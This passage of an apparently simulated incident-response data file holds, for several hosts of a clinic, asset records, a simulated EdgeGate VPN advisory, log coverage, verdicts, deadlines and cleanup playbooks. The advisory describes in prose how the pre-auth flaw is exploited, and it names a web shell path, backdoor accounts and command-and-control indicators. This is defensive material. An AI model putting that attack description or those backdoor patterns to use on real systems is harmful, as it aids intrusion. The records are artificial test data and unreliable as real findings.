          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-LOTUS-002",
      "root_node_id": "lotus-vpn-gw-02",
      "nodes": [
        {
          "id": "lotus-vpn-gw-02",
          "label": "lotus-vpn-gw-02 (Focal Gateway)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "lotus-vpn-gw-02",
          "target": "lotus-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "lotus-vpn-gw-02",
          "target": "lotus-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "lotus-cred-vault",
          "target": "lotus-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "lotus-jump-host-01",
          "target": "lotus-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "lotus-dc-ad-01",
          "target": "lotus-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-LOTUS-005": {
    "asset": {
      "id": "ASSET-LOTUS-005",
      "host_name": "lotus-api-server-01",
      "tenant_id": "lotus-clinics",
      "owner": "admin@lotusclinics.in",
      "product": "EdgeGate VPN",
      "version": "9.0.2",
      "internet_facing": false,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.131",
      "exposure_tier": "high",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-LOTUS-005",
      "overall_coverage": 0.973,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 43 of 45 days available",
        "ENDPOINT: Only 43 of 45 days available",
        "NETWORK: Only 44 of 45 days available",
        "FILE: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-LOTUS-005",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 97% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-lotus-api-server-01"
          ]
        }
      ],
      "coverage_score": 0.973,
      "coverage_report": {
        "asset_id": "ASSET-LOTUS-005",
        "overall_coverage": 0.973,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 43 of 45 days available",
          "ENDPOINT: Only 43 of 45 days available",
          "NETWORK: Only 44 of 45 days available",
          "FILE: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.107666+00:00",
      "verdict_hash": "49955ca841a2f7f25169423c0f5ab4956817eab5e028dc41c79c49d42ed54802"
    },
    "gate": {
      "asset_id": "ASSET-LOTUS-005",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.107670+00:00"
    },
    "clock": {
      "asset_id": "ASSET-LOTUS-005",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113366+00:00",
      "deadline_time": "2026-10-19T17:48:03.113366+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-LOTUS-005-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-LOTUS-005",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate lotus-api-server-01 (192.0.2.131) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-LOTUS-005",
      "root_node_id": "lotus-api-server-01",
      "nodes": [
        {
          "id": "lotus-api-server-01",
          "label": "lotus-api-server-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "lotus-api-server-01",
          "target": "lotus-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "lotus-api-server-01",
          "target": "lotus-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "lotus-cred-vault",
          "target": "lotus-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "lotus-jump-host-01",
          "target": "lotus-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "lotus-dc-ad-01",
          "target": "lotus-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-LOTUS-016": {
    "asset": {
      "id": "ASSET-LOTUS-016",
      "host_name": "lotus-unkn-asset-02",
      "tenant_id": "lotus-clinics",
      "owner": "admin@lotusclinics.in",
      "product": "EdgeGate VPN",
      "version": "Unknown",
      "internet_facing": false,
      "criticality": "medium",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.188",
      "exposure_tier": "high",
      "status": "needs_inventory",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-LOTUS-016",
      "overall_coverage": 0.964,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 41,
          "coverage_ratio": 0.911,
          "gaps": [
            "Missing 4 days of historical telemetry (41/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 42,
          "coverage_ratio": 0.933,
          "gaps": [
            "Missing 3 days of historical telemetry (42/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 44 of 45 days available",
        "AUTH: Only 41 of 45 days available",
        "FILE: Only 42 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-LOTUS-016",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 96% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-lotus-unkn-asset-02"
          ]
        }
      ],
      "coverage_score": 0.964,
      "coverage_report": {
        "asset_id": "ASSET-LOTUS-016",
        "overall_coverage": 0.964,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 41,
            "coverage_ratio": 0.911,
            "gaps": [
              "Missing 4 days of historical telemetry (41/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 42,
            "coverage_ratio": 0.933,
            "gaps": [
              "Missing 3 days of historical telemetry (42/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 44 of 45 days available",
          "AUTH: Only 41 of 45 days available",
          "FILE: Only 42 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.112069+00:00",
      "verdict_hash": "6d2883830c67becfb1951d528a56ead314fc5716a1c901c7f1e704313d3f4370"
    },
    "gate": {
      "asset_id": "ASSET-LOTUS-016",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.112072+00:00"
    },
    "clock": {
      "asset_id": "ASSET-LOTUS-016",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113387+00:00",
      "deadline_time": "2026-10-19T17:48:03.113387+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-LOTUS-016-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-LOTUS-016",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate lotus-unkn-asset-02 (192.0.2.188) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-LOTUS-016",
      "root_node_id": "lotus-unkn-asset-02",
      "nodes": [
        {
          "id": "lotus-unkn-asset-02",
          "label": "lotus-unkn-asset-02 (Focal Gateway)",
          "type": "host",
          "criticality": "medium",
          "compromised": false
        },
        {
          "id": "lotus-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "lotus-unkn-asset-02",
          "target": "lotus-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "lotus-unkn-asset-02",
          "target": "lotus-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "lotus-cred-vault",
          "target": "lotus-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "lotus-jump-host-01",
          "target": "lotus-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "lotus-dc-ad-01",
          "target": "lotus-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  }
};
